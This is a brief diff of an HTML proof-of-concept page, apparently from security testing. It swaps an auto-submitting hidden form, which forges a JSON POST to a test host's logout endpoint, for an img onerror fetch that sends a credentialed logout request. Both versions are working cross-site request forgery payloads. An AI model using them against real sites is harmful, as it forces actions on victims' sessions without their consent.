@@ -1,11 +1,6 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form id="f" action="https://iag-tst-3.welford.net/api/auth/logout" method="POST" enctype="text/plain">
-<input name='{"_":"' value='"}' type="hidden">
-</form>
-<script>
-document.getElementById('f').submit();
-</script>
+<img src="x" onerror="fetch('/api/auth/logout',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:'{}'})">
 </body>
 </html>
